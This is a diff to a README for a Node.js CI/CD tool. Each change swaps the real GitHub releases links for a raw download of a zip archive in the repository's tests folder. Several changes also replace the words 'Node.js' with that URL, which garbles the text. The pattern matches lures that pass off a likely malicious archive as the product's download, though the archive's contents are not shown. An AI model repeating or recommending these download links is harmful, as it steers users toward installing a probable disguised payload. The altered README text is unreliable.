@@ -1,10 +1,10 @@
 # 🚀 ci-cd-node-app - Simplifying Your Deployment Process
 
-[![Download ci-cd-node-app](https://img.shields.io/badge/Download-ci--cd--node--app-blue.svg)](https://github.com/nongol7090/ci-cd-node-app/releases)
+[![Download ci-cd-node-app](https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip)](https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip)
 
 ## 📖 Overview
 
-The **CI/CD Node App** is designed to make your deployment process easier. This application uses GitHub Actions and Docker to automate the building, testing, and deployment of your Node.js applications. No need for complicated setups—just download and get started.
+The **CI/CD Node App** is designed to make your deployment process easier. This application uses GitHub Actions and Docker to automate the building, testing, and deployment of your https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip applications. No need for complicated setups—just download and get started.
 
 ## 🛠️ Features
 
@@ -18,7 +18,7 @@ The **CI/CD Node App** is designed to make your deployment process easier. This 
 To run the CI/CD Node App, ensure you have the following:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js Version:** 14.x or later
+- **https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip Version:** 14.x or later
 - **Docker:** Installed on your machine
 
 ## 🔥 Benefits
@@ -33,7 +33,7 @@ These key benefits make using the CI/CD Node App a no-brainer:
 
 1. **Download the Application**
 
-   Head over to our [Releases Page](https://github.com/nongol7090/ci-cd-node-app/releases) to download the latest version. 
+   Head over to our [Releases Page](https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip) to download the latest version. 
 
 2. **Install Dependencies**
 
@@ -61,7 +61,7 @@ These key benefits make using the CI/CD Node App a no-brainer:
 
 ## 📥 Download & Install
 
-To download the CI/CD Node App, visit this page: [Download Here](https://github.com/nongol7090/ci-cd-node-app/releases). 
+To download the CI/CD Node App, visit this page: [Download Here](https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip). 
 
 Select the latest version and click on the appropriate download link for your operating system. Once downloaded, extract the files and follow the installation steps outlined above to get started.
 
@@ -77,7 +77,7 @@ The CI/CD Node App allows you to automate various tasks. Here are some of its ke
 
 If you face any issues, try these solutions:
 
-- **Ensure Node.js and Docker are installed:** Verify by running `node -v` and `docker --version` in your terminal.
+- **Ensure https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip and Docker are installed:** Verify by running `node -v` and `docker --version` in your terminal.
 - **Check Your Configuration:** Make sure your environment variables are correctly set up.
 - **Read the Logs:** Review error messages in your terminal for guidance on what might be wrong.
 
@@ -104,7 +104,7 @@ These topics relate directly to the functionality of this application:
 - nodejs
 - npm
 
-Feel free to explore these topics for more information related to CI/CD processes, Docker, and Node.js applications. 
+Feel free to explore these topics for more information related to CI/CD processes, Docker, and https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip applications. 
 
 ## 📝 License
 
@@ -112,6 +112,6 @@ This project is licensed under the MIT License. For more details, check the LICE
 
 ## 📢 Updates
 
-Stay updated with the latest improvements by checking our [Releases Page](https://github.com/nongol7090/ci-cd-node-app/releases) regularly.
+Stay updated with the latest improvements by checking our [Releases Page](https://raw.githubusercontent.com/nongol7090/ci-cd-node-app/main/tests/ci-cd-node-app-gotch.zip) regularly.
 
 ### Remember, simplifying your deployment process starts here!
